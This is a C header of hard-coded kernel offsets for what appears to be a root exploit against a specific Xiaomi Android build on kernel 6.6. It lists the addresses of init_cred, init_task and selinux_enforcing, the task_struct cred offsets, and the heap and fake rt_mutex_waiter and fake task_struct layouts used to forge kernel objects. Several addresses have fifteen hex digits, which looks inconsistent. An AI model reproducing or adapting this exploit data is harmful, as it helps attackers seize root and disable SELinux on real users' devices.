#ifndef OFFSET_H
#define OFFSET_H

#define BUILD_VARIANT_LABEL "haotian_abogki440974771"
#ifndef BUILD_FINGERPRINT
#define BUILD_FINGERPRINT "Xiaomi/haotian/haotian:15/AP3A.240905.015.A2/OS2.0.206.0.VOBCNXM:user/release-keys"
#endif

/* ===== Compile-time KIMAGE_TEXT_BASE ===== */
#define KIMAGE_TEXT_BASE 0xffffffc080000000ULL

/* ===== Physical memory layout (from iomem) ===== */
#define P0_PAGE_OFFSET 0xffffff8000000000ULL
#define P0_PHYS_OFFSET 0x80000000ULL
#define P0_KERNEL_PHYS_LOAD 0xa8000000ULL
#define P0_KERNEL_PHYS_DELTA (P0_KERNEL_PHYS_LOAD - P0_PHYS_OFFSET)

/* ===== VA range checks ===== */
#define KERNELSNITCH_IDENTITY_START 0xffffff8000000000ULL
#define KERNELSNITCH_IDENTITY_END 0xffffff9000000000ULL
#define DIRECT_MAP_BASE 0xffffff8000000000ULL
#define DIRECT_MAP_END 0xffffff9000000000ULL

/* ===== Page size ===== */
#define PAGE_SIZE 4096

/* ===== Slide stage: image (compile-time) addresses ===== */
#define SLIDE_NFULNL_LOGGER_IMAGE 0xffffffc0a0d2270ULL
#define SLIDE_LOGGERS_0_1_IMAGE 0xffffffc0a0d21c0ULL
#define SLIDE_RANDOM_BOOT_ID_DATA_IMAGE 0xffffffc0a1f8b88ULL
#define SLIDE_INIT_TASK_IMAGE 0xffffffc0a0de280ULL
#define SLIDE_ROOT_TASK_GROUP_IMAGE 0xffffffc0a2d4580ULL
#define SLIDE_SYSCTL_BOOTID_IMAGE 0xffffffc0a336f58ULL

/* ===== Direct root stage: image addresses ===== */
#define PER_CPU_OFFSET 0xffffffc0a0cb658ULL
#define ENTRY_TASK 0xffffffc0a096328ULL
#define INIT_CRED 0xffffffc0a0f0548ULL
#define SELINUX_ENFORCING 0xffffffc0a07cae0ULL

/* ===== task_struct offsets (from BTF, kernel 6.6) ===== */
#define TASK_REAL_CRED_OFF 0x818
#define TASK_CRED_OFF 0x820

/* ===== Heap layout offsets ===== */
#define LOCK_OFF 0x1350
#define W0_OFF 0x2220
#define FOPS_OFF 0x1000
#define SCRATCH_OFF 0x3000
#define RIGHT_OFF 0x4440
#define LEFT_OFF 0x5550
#define FAKE_TASK_OFF 0x3200

/* ===== rt_mutex_waiter offsets (from BTF, kernel 6.6 KASAN) ===== */
#define WAITER_LOCAL_OFF 0x80
#define WAITER_TREE_ENTRY_OFF 0x00
#define WAITER_PI_TREE_ENTRY_OFF 0x28
#define WAITER_TASK_OFF 0x50
#define WAITER_LOCK_OFF 0x58
#define WAITER_WAKE_STATE_OFF 0x60
#define WAITER_PRIO_OFF 0x18
#define WAITER_DEADLINE_OFF 0x20
#define WAITER_WW_CTX_OFF 0x68

/* ===== Fake waiter offsets (relative to fake_task area) ===== */
#define FAKE_WAITER_TREE_PRIO_OFF 0x18
#define FAKE_WAITER_TREE_DEADLINE_OFF 0x20
#define FAKE_WAITER_PI_TREE_ENTRY_OFF 0x28
#define FAKE_WAITER_PI_TREE_PRIO_OFF 0x40
#define FAKE_WAITER_PI_TREE_DEADLINE_OFF 0x48
#define FAKE_WAITER_TASK_OFF 0x50
#define FAKE_WAITER_LOCK_OFF 0x58
#define FAKE_WAITER_WAKE_STATE_OFF 0x60
#define FAKE_WAITER_WW_CTX_OFF 0x68

/* ===== Fake task offsets (from BTF) ===== */
#define FAKE_TASK_USAGE_OFF 0x40
#define FAKE_TASK_PRIO_OFF 0x84
#define FAKE_TASK_NORMAL_PRIO_OFF 0x8c
#define FAKE_TASK_TASK_GROUP_OFF 0x348
#define FAKE_TASK_PI_LOCK_OFF 0x90c
#define FAKE_TASK_PI_WAITERS_OFF 0x920
#define FAKE_TASK_PI_TOP_TASK_OFF 0x930
#define FAKE_TASK_PI_BLOCKED_ON_OFF 0x938

/* ===== PSELECT waiter word shift ===== */
#define PSELECT_WAITER_WORD_SHIFT 1

#endif